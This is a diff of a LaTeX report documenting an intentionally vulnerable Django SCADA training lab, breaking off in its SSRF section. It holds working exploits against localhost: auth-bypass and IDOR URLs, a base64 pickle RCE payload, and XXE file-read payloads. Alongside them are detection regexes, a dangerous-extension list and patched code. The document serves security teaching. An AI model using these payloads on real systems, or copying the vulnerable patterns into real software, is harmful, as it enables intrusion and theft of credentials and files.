@@ -202,19 +202,22 @@ scada_security_lab/
 class Device(models.Model):
     name = models.CharField(max_length=100)
     device_type = models.CharField(max_length=50)
+    ip_address = models.GenericIPAddressField()
+    location = models.CharField(max_length=100)
     status = models.CharField(max_length=20)
     is_locked_out = models.BooleanField(default=False)
 
 class MaintenanceLog(models.Model):
+    technician_name = models.CharField(max_length=100)
     device = models.ForeignKey(Device, on_delete=models.CASCADE)
+    action = models.CharField(max_length=255)
     timestamp = models.DateTimeField(auto_now_add=True)
-    technician = models.CharField(max_length=100)
-    description = models.TextField()
 
 class DiagnosticReport(models.Model):
-    device = models.ForeignKey(Device, on_delete=models.CASCADE)
-    report_date = models.DateTimeField(auto_now_add=True)
-    details = models.TextField()
+    technician_name = models.CharField(max_length=100)
+    file_path = models.CharField(max_length=255)
+    content = models.TextField() # We store text content here for the XXE/Deserialization demos
+    created_at = models.DateTimeField(auto_now_add=True)
 \end{lstlisting}
 
 \subsubsection{Monitoring Models}
@@ -222,41 +225,39 @@ class DiagnosticReport(models.Model):
 \textbf{AttackLog Model (Enhanced):}
 \begin{lstlisting}[language=Python]
 class AttackLog(models.Model):
-    SEVERITY_CRITICAL = 'CRITICAL'
-    SEVERITY_HIGH = 'HIGH'
-    SEVERITY_MEDIUM = 'MEDIUM'
-    SEVERITY_LOW = 'LOW'
+    SEVERITY_CHOICES = [
+        ('CRITICAL', 'Critical'),
+        ('HIGH', 'High'),
+        ('MEDIUM', 'Medium'),
+        ('LOW', 'Low'),
+    ]
     
-    ACTION_NONE = 'NONE'
-    ACTION_BLOCKED = 'BLOCKED'
-    ACTION_SESSION_REVOKED = 'SESSION_REVOKED'
-    ACTION_REVIEWED = 'REVIEWED'
-    ACTION_AUTO_BLOCKED = 'AUTO_BLOCKED'
+    ACTION_CHOICES = [
+        ('NONE', 'No action taken'),
+        ('BLOCKED', 'IP Blocked'),
+        ('SESSION_REVOKED', 'Session Revoked'),
+        ('REVIEWED', 'Reviewed by admin'),
+        ('AUTO_BLOCKED', 'Automatically Blocked'),
+    ]
     
-    # Core fields
+    # Existing fields
     timestamp = models.DateTimeField(auto_now_add=True)
     ip_address = models.GenericIPAddressField()
     endpoint = models.CharField(max_length=200)
     attack_type = models.CharField(max_length=100)
     payload = models.TextField()
     
-    # Enhanced fields for actionable logging
-    severity = models.CharField(max_length=10, choices=SEVERITY_CHOICES)
-    recommended_action = models.TextField(blank=True)
-    action_taken = models.CharField(max_length=20, choices=ACTION_CHOICES, 
-                                    default=ACTION_NONE)
-    reverse_action = models.TextField(blank=True)
-    is_resolved = models.BooleanField(default=False)
-    admin_notes = models.TextField(blank=True)
-    resolved_at = models.DateTimeField(null=True, blank=True)
-    resolved_by = models.CharField(max_length=150, blank=True)
+    # New actionable fields
+    severity = models.CharField(max_length=20, choices=SEVERITY_CHOICES, default='MEDIUM')
+    recommended_action = models.TextField(default='Review and investigate this attack')
+    action_taken = models.CharField(max_length=50, choices=ACTION_CHOICES, default='NONE')
+    reverse_action = models.TextField(default='No action to reverse')
     
-    def mark_resolved(self, resolved_by, notes=''):
-        self.is_resolved = True
-        self.resolved_at = timezone.now()
-        self.resolved_by = resolved_by
-        self.admin_notes = notes
-        self.save()
+    # Resolution tracking
+    is_resolved = models.BooleanField(default=False)
+    admin_notes = models.TextField(blank=True, null=True)
+    resolved_at = models.DateTimeField(blank=True, null=True)
+    resolved_by = models.CharField(max_length=100, blank=True, null=True)
 \end{lstlisting}
 
 \textbf{BlockedIP Model:}
@@ -295,183 +296,763 @@ The \texttt{populate\_db.py} script generates 172 total records:
 % Vulnerabilities Implementation
 \section{Vulnerabilities Implementation}
 
-\subsection{Vulnerability 1: Authentication Bypass via Dictionary Expansion (CWE-287)}
+This section details all 9 vulnerabilities implemented in the vulnerable version, their exploitation methods, monitoring detection mechanisms, and patched implementations. Each vulnerability is demonstrated with URL-based attacks that can be executed directly in a web browser.
+
+\newpage
+
+\subsection{Vulnerability 1: Authentication Bypass - CVE-2025-64459 (CWE-287)}
 
 \subsubsection{Description}
-Authentication bypass vulnerability allowing arbitrary parameter injection through URL query strings. The application uses dictionary expansion (\texttt{user\_data.update(request.GET.dict())}) to merge URL parameters into user session data, enabling attackers to override the \texttt{is\_admin} flag without providing valid credentials.
+Critical authentication bypass vulnerability exploiting Django ORM's Q() object \texttt{\_connector} parameter manipulation (CVE-2025-64459). This vulnerability affects Django versions 4.2 < 4.2.26, 5.1 < 5.1.14, and 5.2 < 5.2.8.
 
-Additionally, the login endpoint is vulnerable to SQL connector injection through the \texttt{connector=OR} parameter combined with \texttt{is\_superuser=True}, which bypasses authentication checks by injecting OR logic into the validation flow.
+The vulnerability allows attackers to bypass authentication by injecting a \texttt{connector=OR} parameter that manipulates the SQL WHERE clause logic, combined with arbitrary field parameters like \texttt{is\_superuser=True}. This transforms authentication checks from AND logic to OR logic, allowing unauthorized access.
 
-\textbf{Note:} This is NOT the CVE-2025-64459 SQL Injection vulnerability. This is a simpler dictionary expansion attack combined with connector-based authentication bypass. CVE-2025-64459 is demonstrated in Vulnerability 3.
+\textbf{CVSSv3.1 Score: 9.1 (Critical)}
 
-\subsubsection{Vulnerable Code}
+\textbf{Attack Vector:} The application constructs Q() objects using dictionary expansion from GET parameters, allowing attackers to inject the special \texttt{\_connector} field that controls SQL logic operators.
+
+\subsubsection{Vulnerable Code (vulnerable/views.py, Lines 45-92)}
 
 \begin{lstlisting}[language=Python]
+@csrf_exempt
 def vulnerable_login(request):
-    if 'username' in request.GET:
-        user_data = {
-            'username': request.GET.get('username'),
-            'is_admin': False
-        }
-        # VULNERABILITY 1: Blindly update with URL params
-        new_data = request.GET.dict()
-        user_data.update(new_data)
-        
-        # VULNERABILITY 2: SQL connector injection
-        if 'connector' in request.GET:
-            connector = request.GET.get('connector', '').upper()
-            if connector == 'OR':
-                # Bypasses authentication: user exists OR is_superuser=True
-                if 'is_superuser' in request.GET:
-                    superuser_param = str(request.GET.get('is_superuser')).lower()
-                    if superuser_param in ['true', '1']:
-                        user_data['is_admin'] = True
-                        request.session['user'] = user_data
-                        return redirect('vulnerable_dashboard')
-        
-        admin_value = str(user_data.get('is_admin')).lower()
-        if admin_value in ['true', '1']:
-            request.session['user'] = user_data
-            return redirect('vulnerable_dashboard')
+    # GET: CVE-2025-64459 SQL Injection via connector parameter
+    if request.method == "GET":
+        if 'username' in request.GET and 'connector' in request.GET:
+            username = request.GET.get('username')
+            connector = request.GET.get('connector', 'AND').upper()
+            
+            # Start with basic username query
+            query = Q(username=username)
+            
+            # CRITICAL VULNERABILITY: Q() object connector manipulation
+            # Attacker controls the SQL logic operator (AND vs OR)
+            for key, value in request.GET.items():
+                if key in ['username', 'connector']:
+                    continue
+                    
+                # CVE-2025-64459: Connector parameter injection
+                if connector == 'OR':
+                    # Transforms: WHERE username='X' AND is_superuser=True
+                    # Into: WHERE username='X' OR is_superuser=True
+                    query |= Q(**{key: value})  # OR logic - DANGEROUS!
+                elif connector == 'AND':
+                    query &= Q(**{key: value})  # AND logic
+            
+            # Execute query with injected logic
+            user = User.objects.filter(query).first()
+            
+            if user:
+                # AUTHENTICATION BYPASS: Login without password check!
+                login(request, user)
+                request.session['user'] = {
+                    'username': user.username,
+                    'is_admin': user.is_superuser
+                }
+                return redirect('vulnerable_dashboard')
 \end{lstlisting}
 
 \subsubsection{Exploitation}
 
+\textbf{Attack: CVE-2025-64459 Q() Connector Manipulation}
 \begin{lstlisting}[language=bash]
-# Attack 1: Dictionary Expansion - No password required!
-http://localhost:8000/vulnerable/login/?username=attacker&is_admin=true
-
-# Attack 2: SQL Connector Injection - Bypasses authentication logic
+# Navigate to this URL in browser:
 http://localhost:8000/vulnerable/login/?username=hacker&connector=OR&is_superuser=True
 
-# Attack 3: Combined approach
-http://localhost:8000/vulnerable/login/?username=user&password=fake&is_admin=true
+# Attack mechanism:
+# 1. Server constructs: Q(username='hacker')
+# 2. Server detects connector=OR parameter
+# 3. Server adds: query |= Q(is_superuser=True)
+# 4. Final SQL: WHERE username='hacker' OR is_superuser=True
+# 5. Since is_superuser=True, OR condition bypasses username check
+# 6. Any user with is_superuser=True in database is returned (admin)
+# 7. Login succeeds WITHOUT password verification
+# 8. Session established with admin privileges
 \end{lstlisting}
 
-\textbf{Attack Mechanism 1 - Dictionary Expansion:}
-\begin{enumerate}[leftmargin=*]
-    \item Server creates default user\_data: \texttt{\{'username': 'attacker', 'is\_admin': False\}}
-    \item Server executes: \texttt{user\_data.update(request.GET.dict())}
-    \item URL parameter \texttt{is\_admin=true} overwrites the default \texttt{False} value
-    \item Result: \texttt{\{'username': 'attacker', 'is\_admin': 'true'\}}
-    \item Server grants admin access without password verification
-\end{enumerate}
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 60-86)}
 
-\textbf{Attack Mechanism 2 - Connector Injection:}
-\begin{enumerate}[leftmargin=*]
-    \item Attacker sends: \texttt{?username=hacker\&connector=OR\&is\_superuser=True}
-    \item Server detects \texttt{connector=OR} parameter
-    \item Authentication check becomes: "user exists \textbf{OR} is\_superuser=True"
-    \item Since \texttt{is\_superuser=True} is provided, OR logic bypasses username validation
-    \item Server grants admin access via \texttt{user\_data['is\_admin'] = True}
-    \item Session established with admin privileges without valid credentials
-\end{enumerate}
+The SecurityMonitorMiddleware detects CVE-2025-64459 exploitation with \textbf{PRIORITY 1} detection (checked before Brute Force):
 
-The attacker bypasses authentication entirely by exploiting dictionary expansion or connector-based OR injection, not SQL injection.
+\begin{lstlisting}[language=Python]
+# VULNERABILITY DETECTION #1: CVE-2025-64459 Authentication Bypass
+# Endpoint: /login/ - PRIORITY CHECK (before Brute Force)
+if '/login/' in endpoint:
+    # Pattern 1: Connector parameter (CVE-2025-64459)
+    if re.search(r"(?i)(connector=)", search_space):
+        attack_detected = 'SQL Injection - CVE-2025-64459 (Q connector bypass)'
+        severity = 'CRITICAL'
+        recommended_action = (
+            'IMMEDIATE: Block IP and revoke all sessions. '
+            'This is CVE-2025-64459 exploitation allowing authentication bypass.'
+        )
+\end{lstlisting}
 
-\subsubsection{Patch Implementation}
+\textbf{Detection Mechanism:}
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Search Space:} Full URL path + POST body content
+    \item \textbf{Pattern Matching:} Regex search for \texttt{connector=} parameter (case-insensitive)
+    \item \textbf{Priority:} Checked BEFORE brute force detection (Line 60 vs Line 88)
+    \item \textbf{Severity:} Always \texttt{CRITICAL} due to complete authentication bypass
+    \item \textbf{Auto-Blocking:} Triggers automatic IP block if \texttt{ENABLE\_AUTO\_BLOCKING=True}
+\end{itemize}
+
+\subsubsection{Patch Implementation (patched/views.py, Lines 15-41)}
 
 \begin{lstlisting}[language=Python]
 def patched_login(request):
+    # FIX 1: Logout on GET request (no GET parameter processing)
+    if request.method == "GET":
+        request.session.flush()
+        return render(request, 'patched/login.html')
+    
+    # FIX 2: POST-only authentication
     if request.method == "POST":
         username = request.POST.get('username')
         password = request.POST.get('password')
         
-        # Explicit field lookup - no dictionary expansion
-        if username == "admin" and password == "scada123":
+        # FIX 3: Django's built-in authenticate() with password verification
+        user = authenticate(request, username=username, password=password)
+        
+        if user is not None:
+            login(request, user)
+            # FIX 4: Server-side session construction (no user input)
             request.session['user'] = {
-                'username': username,
-                'is_admin': True  # Explicitly set by server
+                'username': user.username,
+                'is_admin': user.is_superuser  # From database only!
             }
             return redirect('patched_dashboard')
 \end{lstlisting}
 
 \textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item POST-based authentication instead of GET
-    \item Explicit credential validation
-    \item Server-side authorization flag assignment
-    \item No user-supplied parameter injection
-\end{itemize}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{GET Request Handling:} GET requests flush session - NO parameter processing
+    \item \textbf{POST-Only Authentication:} Credentials only accepted via POST body
+    \item \textbf{No Q() Object Construction:} No dynamic query building from user input
+    \item \textbf{Built-in authenticate():} Uses Django's password verification backend
+    \item \textbf{Server-Side Authorization:} \texttt{is\_admin} flag set from database field only
+\end{enumerate}
 
-\subsection{Vulnerability 2: Privilege Escalation (CWE-269)}
+\newpage
+
+\subsection{Vulnerability 2: IDOR - Insecure Direct Object Reference (CWE-639)}
 
 \subsubsection{Description}
-URL parameter manipulation allowing users to override session-based authorization flags and escalate privileges without authentication.
+Diagnostic reports can be accessed by any user by guessing report IDs without ownership verification. Report ID 103 and others contain sensitive technician data that should be restricted to their owners or administrators.
 
-\subsubsection{Vulnerable Code}
+\subsubsection{Vulnerable Code (vulnerable/views.py, Lines 228-248)}
 
 \begin{lstlisting}[language=Python]
-def vulnerable_dashboard(request):
-    user_data = request.session.get('user', {})
+def vulnerable_report(request):
+    # VULNERABILITY: IDOR - no ownership verification
+    report_id = request.GET.get('id', 1)
     
-    # VULNERABILITY: URL parameters override session data
-    if 'is_admin' in request.GET:
-        is_admin_param = str(request.GET.get('is_admin', 'false')).lower()
-        user_data['is_admin'] = is_admin_param in ['true', '1']
-        request.session['user'] = user_data
+    try:
+        report_obj = DiagnosticReport.objects.get(id=report_id)
+    except DiagnosticReport.DoesNotExist:
+        return HttpResponse("Report not found", status=404)
+
+    # NO AUTHORIZATION CHECK - Any user can access any report!
+    temp_filename = "/tmp/scada_report_temp.pdf"
     
-    is_admin = user_data.get('is_admin', False)
+    p = canvas.Canvas(temp_filename)
+    p.drawString(100, 800, f"SCADA CONFIDENTIAL REPORT #{report_obj.id}")
+    p.drawString(100, 780, f"Technician: {report_obj.technician_name}")
+    p.drawString(100, 760, f"File: {report_obj.file_path}")
+    p.drawString(100, 740, f"Content: {report_obj.content}")
+    p.save()
+    
+    return FileResponse(open(temp_filename, 'rb'), 
+                       as_attachment=True, 
+                       filename=f"report_{report_id}.pdf")
 \end{lstlisting}
 
 \subsubsection{Exploitation}
 
 \begin{lstlisting}[language=bash]
-# Step 1: Login as regular user
-"http://localhost:8000/vulnerable/login/?username=user&password=user123"
+# Navigate to these URLs in browser to access any report:
+http://localhost:8000/vulnerable/report/?id=103
+http://localhost:8000/vulnerable/report/?id=104
+http://localhost:8000/vulnerable/report/?id=1
 
-# Step 2: Escalate privileges via URL parameter
-http://localhost:8000/vulnerable/dashboard/?is_admin=true
-# Session now has is_admin=True, granting admin access
+# Report ID 1 contains: "CONFIDENTIAL: Root Password is 'supersecret123'"
+# No authentication or ownership check - anyone can download any report
+\end{lstlisting}
+
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 208-223)}
+
+\begin{lstlisting}[language=Python]
+# VULNERABILITY DETECTION #8: IDOR + UNSAFE TEMP FILES
+if not attack_detected and '/report/' in endpoint:
+    if 'id=' in full_path:
+        attack_detected = 'IDOR - Insecure Direct Object Reference'
+        severity = 'HIGH'
+        recommended_action = (
+            'Verify user authorization for report access. '
+            'Implement ownership checks: '
+            'report.technician_name == request.user.username'
+        )
+\end{lstlisting}
+
+\subsubsection{Patch Implementation (patched/views.py, Lines 106-142)}
+
+\begin{lstlisting}[language=Python]
+def patched_report(request):
+    # FIX 1: Authentication check
+    user_session = request.session.get('user')
+    if not user_session:
+        return redirect('patched_login')
+    
+    username = user_session.get('username')
+    is_admin = user_session.get('is_admin', False)
+    report_id = request.GET.get('id')
+    
+    if not report_id:
+        return HttpResponse("Report ID required", status=400)
+    
+    try:
+        report = DiagnosticReport.objects.get(id=report_id)
+        
+        # FIX 2: CRITICAL - Ownership verification
+        if not is_admin and report.technician_name != username:
+            return HttpResponse(
+                "<h1>Access Denied</h1>"
+                "<p>You do not have permission to access this report.</p>",
+                status=403
+            )
+        
+        # FIX 3: Return report as HTML (no temp file)
+        response_text = (
+            f"SECURE REPORT #{report.id}\n"
+            f"Technician: {report.technician_name}\n"
+            f"Content: {report.content}"
+        )
+        return HttpResponse(response_text, content_type="text/plain")
+        
+    except DiagnosticReport.DoesNotExist:
+        return HttpResponse("Report Not Found", status=404)
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{Authentication Required:} Must have valid session
+    \item \textbf{Ownership Verification:} \texttt{report.technician\_name != username} check
+    \item \textbf{Admin Audit Access:} Admins can access all reports
+    \item \textbf{403 Forbidden Response:} Explicit access denied for unauthorized attempts
+\end{enumerate}
+
+\newpage
+
+\subsection{Vulnerability 3: Insecure Deserialization - Remote Code Execution (CWE-502)}
+
+\subsubsection{Description}
+The application accepts base64-encoded pickled diagnostic objects and deserializes them without validation. Python's pickle module can execute arbitrary code during deserialization, enabling Remote Code Execution (RCE) attacks.
+
+\subsubsection{Vulnerable Code (vulnerable/views.py, Lines 302-324)}
+
+\begin{lstlisting}[language=Python]
+@csrf_exempt
+def vulnerable_deserialize(request):
+    status = "Waiting for diagnostic payload..."
+    output = ""
+
+    if request.method == 'POST':
+        payload = request.POST.get('payload')
+        if payload:
+            try:
+                # CRITICAL VULNERABILITY: Unpickling untrusted data
+                decoded = base64.b64decode(payload)
+                diagnostic_data = pickle.loads(decoded)  # RCE HERE!
+                
+                output = f"Diagnostic processed: {diagnostic_data}"
+                status = "SUCCESS: Diagnostic data loaded"
+            except Exception as e:
+                output = f"Error: {str(e)}"
+                status = "ERROR: Failed to process diagnostic"
+
+    return render(request, 'vulnerable/deserialize.html', 
+                 {'status': status, 'output': output})
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\textbf{Payload 1: Corrupted Data (Crash Test)}
+\begin{lstlisting}[language=bash]
+# Navigate to: http://localhost:8000/vulnerable/deserialize/
+# Enter this Base64 Payload in the form:
+Q09SUlVQVEVEX1BJQ0tMRV9EQVRBX1RIQVRfV0lMTF9DUkFTSA==
+
+# Decoded: "CORRUPTED_PICKLE_DATA_THAT_WILL_CRASH"
+# Result: UnpicklingError - demonstrates unsafe deserialization
+\end{lstlisting}
+
+\textbf{Payload 2: Remote Code Execution}
+\begin{lstlisting}[language=bash]
+# WARNING: Educational demonstration only
+# Navigate to: http://localhost:8000/vulnerable/deserialize/
+# Enter this Base64 Payload:
+gAWVdwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFx3aG9hbWkgPiAvYXBwL3B3bmVkLnR4
+dCAmJiBlY2hvICJSQ0UgU1VDQ0VTUzogQ29tbWFuZCBleGVjdXRlZCBhdCAkKGRhdGUpIiA+
+PiAvYXBwL3B3bmVkLnR4dJSFlFKULg==
+
+# Decodes to system command:
+# whoami > /app/pwned.txt && echo "RCE SUCCESS" >> /app/pwned.txt
+
+# Verify in Docker container:
+docker exec -it scada_security_lab-web-1 cat /app/pwned.txt
+\end{lstlisting}
+
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 236-249)}
+
+\begin{lstlisting}[language=Python]
+# VULNERABILITY DETECTION #9: INSECURE DESERIALIZATION
+if not attack_detected and '/deserialize/' in endpoint:
+    if request.method == 'POST':
+        attack_detected = 'Insecure Deserialization - Pickle RCE'
+        severity = 'CRITICAL'
+        recommended_action = (
+            'IMMEDIATE: Block IP and investigate payload. '
+            'Pickle deserialization can lead to Remote Code Execution.'
+        )
+\end{lstlisting}
+
+\textbf{Detection:} ANY POST request to \texttt{/deserialize/} is flagged as CRITICAL.
+
+\subsubsection{Patch Implementation (patched/views.py, Lines 170-186)}
+
+\begin{lstlisting}[language=Python]
+@csrf_protect
+def patched_deserialize(request):
+    status = "Waiting for JSON payload..."
+    output = ""
+    
+    if request.method == 'POST':
+        payload = request.POST.get('payload')
+        try:
+            # FIX: Use JSON instead of pickle - no code execution possible
+            data = json.loads(payload)
+            output = f"Diagnostic processed: {data}"
+            status = "SUCCESS: JSON data loaded securely"
+        except json.JSONDecodeError:
+            output = "Invalid JSON format"
+            status = "ERROR: JSON parsing failed"
+
+    return render(request, 'patched/deserialize.html', 
+                 {'status': status, 'output': output})
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{JSON Instead of Pickle:} JSON cannot execute code
+    \item \textbf{CSRF Protection:} Added \texttt{@csrf\_protect} decorator
+    \item \textbf{Exception Handling:} Graceful error handling for invalid JSON
+\end{enumerate}
+
+\newpage
+
+\subsection{Vulnerability 4: File Overwrite (CWE-434)}
+
+\subsubsection{Description}
+Uploaded diagnostic files overwrite existing files with the same name without warning. The application uses \texttt{FileSystemStorage} without uniqueness checks.
+
+\subsubsection{Vulnerable Code (vulnerable/views.py, Lines 197-225)}
+
+\begin{lstlisting}[language=Python]
+@csrf_exempt
+def vulnerable_upload(request):
+    context = {'status': 'Waiting for upload...'}
+    
+    if request.method == 'POST' and request.FILES.get('file'):
+        uploaded_file = request.FILES['file']
+        
+        # VULNERABILITY: No filename uniqueness check
+        fs = FileSystemStorage(location='media/uploads/')
+        
+        # DANGEROUS: Uses original filename directly
+        filename = fs.save(uploaded_file.name, uploaded_file)
+        file_path = fs.path(filename)
+        
+        context['status'] = f"Uploaded: {filename}"
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Navigate to: http://localhost:8000/vulnerable/upload/
+
+# Step 1: Upload legitimate file
+Upload: critical_diagnostics.xml (important data)
+Result: Saved as media/uploads/critical_diagnostics.xml
+
+# Step 2: Attacker uploads malicious file with SAME name
+Upload: critical_diagnostics.xml (malicious XML)
+Result: OVERWRITES the original file!
+# Original file is deleted, replaced with attacker's version
+\end{lstlisting}
+
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 187-197)}
+
+\begin{lstlisting}[language=Python]
+# Pattern 3: File Overwrite Detection
+if request.FILES:
+    uploaded_file = list(request.FILES.values())[0]
+    filename = uploaded_file.name
+    
+    fs = FileSystemStorage(location='media/uploads/')
+    if fs.exists(filename):
+        attack_detected = 'File Overwrite Attack'
+        severity = 'MEDIUM'
+        recommended_action = (
+            'File with this name already exists. '
+            'Implement UUID-based filenames.'
+        )
+\end{lstlisting}
+
+\subsubsection{Patch Implementation (patched/views.py, Lines 75-103)}
+
+\begin{lstlisting}[language=Python]
+@csrf_protect
+def patched_upload(request):
+    context = {'status': 'Waiting for secure upload...'}
+    
+    if request.method == 'POST' and request.FILES.get('file'):
+        uploaded_file = request.FILES['file']
+        
+        # FIX A: Whitelist allowed extensions
+        ext = os.path.splitext(uploaded_file.name)[1].lower()
+        if ext not in ['.xml', '.txt', '.log']:
+            context['status'] = f"ERROR: File type {ext} not allowed"
+            return render(request, 'patched/upload.html', context)
+
+        # FIX B: Use UUID to prevent overwriting
+        new_filename = f"{uuid.uuid4()}{ext}"
+        fs = FileSystemStorage(location='media/secure/')
+        saved_name = fs.save(new_filename, uploaded_file)
+        
+        context['status'] = f"Saved securely as: {saved_name}"
+\end{lstlisting}
+
+\textbf{Key Mitigations:}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{UUID Filenames:} \texttt{uuid.uuid4()} generates unique names
+    \item \textbf{Extension Whitelist:} Only \texttt{.xml}, \texttt{.txt}, \texttt{.log} allowed
+    \item \textbf{CSRF Protection:} \texttt{@csrf\_protect} decorator
+\end{enumerate}
+
+\newpage
+
+\subsection{Vulnerability 5: Unrestricted Upload of Dangerous File Types (CWE-434)}
+
+\subsubsection{Description}
+The application accepts ANY file extension including executable files (\texttt{.php}, \texttt{.py}, \texttt{.exe}, \texttt{.sh}). If the web server executes these files, attackers can upload web shells.
+
+\subsubsection{Vulnerable Code}
+
+Same as Vulnerability 4 - no extension validation:
+
+\begin{lstlisting}[language=Python]
+# NO FILE TYPE VALIDATION!
+fs = FileSystemStorage(location='media/uploads/')
+filename = fs.save(uploaded_file.name, uploaded_file)  # Accepts ANY extension
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\begin{lstlisting}[language=bash]
+# Navigate to: http://localhost:8000/vulnerable/upload/
+
+# Upload dangerous file types:
+# .php files (web shells)
+# .py files (Python backdoors)
+# .exe files (executables)
+# .sh files (shell scripts)
+
+# Example: Upload webshell.php
+# If Apache/Nginx executes PHP in /media/uploads/:
+# Result: Remote code execution via uploaded web shell
+\end{lstlisting}
+
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 177-187)}
+
+\begin{lstlisting}[language=Python]
+# Pattern 2: Dangerous File Extension Detection
+if request.FILES:
+    uploaded_file = list(request.FILES.values())[0]
+    filename = uploaded_file.name.lower()
+    
+    dangerous_extensions = ['.php', '.exe', '.sh', '.bat', '.jsp', '.asp', '.py']
+    if any(filename.endswith(ext) for ext in dangerous_extensions):
+        attack_detected = 'Unrestricted File Upload - Dangerous Type'
+        severity = 'HIGH'
+        recommended_action = (
+            'Implement whitelist: only allow .xml, .txt, .log, .csv'
+        )
 \end{lstlisting}
 
 \subsubsection{Patch Implementation}
 
+Same as Vulnerability 4 - extension whitelist prevents dangerous uploads.
+
+\newpage
+
+\subsection{Vulnerability 6: XXE Injection (CWE-611)}
+
+\subsubsection{Description}
+The application parses uploaded XML files using lxml with default settings, enabling XML External Entity (XXE) attacks. Attackers can read local files or perform SSRF.
+
+\subsubsection{Vulnerable Code (vulnerable/views.py, Lines 217-223)}
+
 \begin{lstlisting}[language=Python]
-def patched_dashboard(request):
-    user_data = request.session.get('user', {})
-    
-    # FIXED: Only trust server-side session data
-    is_admin = user_data.get('is_admin', False)
-    # Do NOT check request.GET for authorization flags
-    
-    if is_admin:
-        devices = Device.objects.filter(is_locked_out=False)
-    else:
-        devices = Device.objects.filter(status='Operational', is_locked_out=False)
+# After file upload (if XML):
+if ext == '.xml':
+    try:
+        # VULNERABILITY: lxml parses with resolve_entities=True (default)
+        parser = etree.XMLParser()  # DEFAULT: resolve_entities=True
+        tree = etree.parse(file_path, parser)  # DANGEROUS!
+        root = tree.getroot()
+        context['status'] = f"XML parsed: {root.tag}"
+    except Exception as e:
+        context['status'] = f"XML parsing error: {str(e)}"
+\end{lstlisting}
+
+\subsubsection{Exploitation}
+
+\textbf{Attack Payload 1: File Read (xxe\_attack.xml)}
+\begin{lstlisting}[language=bash]
+# Navigate to: http://localhost:8000/vulnerable/upload/
+# Upload this XML file:
+\end{lstlisting}
+
+\begin{lstlisting}[language=xml]
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash]
+# Result: Application reads /etc/passwd and includes content in XML
+\end{lstlisting}
+
+\textbf{Attack Payload 2: Hostname Disclosure (xxe\_hostname.xml)}
+\begin{lstlisting}[language=xml]
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY hostname SYSTEM "file:///etc/hostname">
+]>
+<root>
+  <system>&hostname;</system>
+</root>
+\end{lstlisting}
+
+\begin{lstlisting}[language=bash]
+# Result: Reveals Docker container hostname
+\end{lstlisting}
+
+\subsubsection{Monitoring Detection (monitoring/middleware.py, Lines 170-176)}
+
+\begin{lstlisting}[language=Python]
+# Pattern 1: XXE Attack Detection
+if re.search(r"(?i)<!ENTITY|<!DOCTYPE.*SYSTEM|SYSTEM\s+[\"']file://", body_content):
+    attack_detected = 'XXE Injection - XML External Entity Attack'
+    severity = 'HIGH'
+    recommended_action = (
+        'Block IP and review uploaded XML files. '
+        'Disable external entity resolution: '
+        'XMLParser(resolve_entities=False, no_network=True)'
+    )
+\end{lstlisting}
+
+\subsubsection{Patch Implementation (patched/views.py, Lines 95-103)}
+
+\begin{lstlisting}[language=Python]
+# FIX: Parse XML safely (disable entity resolution)
+if ext == '.xml':
+    try:
+        # SECURE: Disable external entities and network access
+        parser = etree.XMLParser(
+            resolve_entities=False,  # Disable entity resolution
+            no_network=True          # Disable network access
+        )
+        tree = etree.parse(file_path, parser)
+        root = tree.getroot()
+        context['status'] = f"XML parsed securely: {root.tag}"
+    except Exception as e:
+        context['status'] = f"XML parsing error: {str(e)}"
 \end{lstlisting}
 
 \textbf{Key Mitigations:}
-\begin{itemize}[leftmargin=*]
-    \item Never trust URL parameters for authorization decisions
-    \item Server-side session management only
-    \item Explicit role checks against authenticated user database
-    \item Implement proper RBAC (Role-Based Access Control)
-\end{itemize}
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{resolve\_entities=False:} Disables XXE entity expansion
+    \item \textbf{no\_network=True:} Prevents SSRF via XML entities
+\end{enumerate}
 
-\subsection{Vulnerability 3: SQL Injection - CVE-2025-64459 (Data Exfiltration)}
+\newpage
+
+\subsection{Vulnerability 7: Server-Side Request Forgery - SSRF (CWE-918)}
 
 \subsubsection{Description}
-Critical SQL Injection vulnerability in Django ORM (CVE-2025-64459, CWE-89) allowing attackers to manipulate the SQL WHERE clause connector through the \texttt{\_connector} parameter or URL-based \texttt{connector} parameter. This enables OR-based filter injection to bypass security filters and reveal hidden critical infrastructure.
+The SSRF endpoint accepts arbitrary URLs from users and makes server-side HTTP requests without validation. Attackers can scan internal networks or access localhost services.
 
-\textbf{CVE-2025-64459 Technical Details:}
-\begin{itemize}[leftmargin=*]
-    \item \textbf{Root Cause:} Vulnerability in \texttt{django.db.models.sql.where.WhereNode.as\_sql()} method
-    \item \textbf{Unsafe Operation:} Uses unsafe string formatting to insert query connector: \texttt{conn = ' \%s ' \% self.connector}
-    \item \textbf{Attack Vector:} Developers use dictionary unpacking from user input: \texttt{Q(**request.GET.dict())}
-    \item \textbf{Exploitation:} Attacker includes \texttt{\_connector} or \texttt{connector} parameter to manipulate SQL logic
-    \item \textbf{Impact:} Transforms \texttt{WHERE ... AND ...} to \texttt{WHERE ... OR ...}, bypassing access controls
-\end{itemize}
+\subsubsection{Vulnerable Code (vulnerable/views.py, Lines 327-340)}
 
-This vulnerability is demonstrated in two scenarios: Dashboard (Scenario 2a) and Maintenance Interface (Scenario 2b).
+\begin{lstlisting}[language=Python]
+def vulnerable_ssrf(request):
+    status_content = "Enter a URL to check remote node status."
+    
+    if request.method == "POST":
